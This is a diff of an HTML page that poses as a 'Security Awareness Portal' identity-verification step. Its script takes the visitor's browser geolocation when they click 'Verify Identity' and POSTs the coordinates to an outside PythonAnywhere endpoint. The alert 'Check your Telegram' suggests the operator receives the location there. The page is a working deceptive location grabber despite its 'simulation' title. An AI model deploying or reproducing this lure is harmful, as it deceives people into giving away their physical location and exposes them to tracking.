@@ -1,21 +1,58 @@
-<script>
-    const SERVER_URL = "https://adishakti.pythonanywhere.com/send-data";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Awareness Simulation</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9; }
+        .container { background: white; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; font-weight: bold; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Security Awareness Portal</h1>
+        <p>Click the button below to complete your identity verification.</p>
+        <br>
+        <button id="demoBtn">Verify Identity</button>
+    </div>
 
-    document.getElementById('demoBtn').onclick = async () => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const payload = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                try {
-                    await fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(payload)
-                    });
-                    alert("Identity verified!");
-                } catch (error) {
-                    console.error("Error:", error);
-                }
-            });
-        }
-    };
-</script>
+    <script>
+        // Points directly to your PythonAnywhere backend
+        const SERVER_URL = "https://adishakti.pythonanywhere.com/send-data";
+
+        document.getElementById('demoBtn').onclick = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const payload = { 
+                        lat: pos.coords.latitude, 
+                        lon: pos.coords.longitude 
+                    };
+
+                    try {
+                        const res = await fetch(SERVER_URL, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify(payload)
+                        });
+                        if (res.ok) {
+                            alert("Verification complete! Check your Telegram.");
+                        } else {
+                            alert("Server responded with an error.");
+                        }
+                    } catch (error) {
+                        alert("Connection failed. Check your browser console for details.");
+                        console.error("Error:", error);
+                    }
+                }, (err) => {
+                    alert("Location access denied by user.");
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        };
+    </script>
+</body>
+</html>
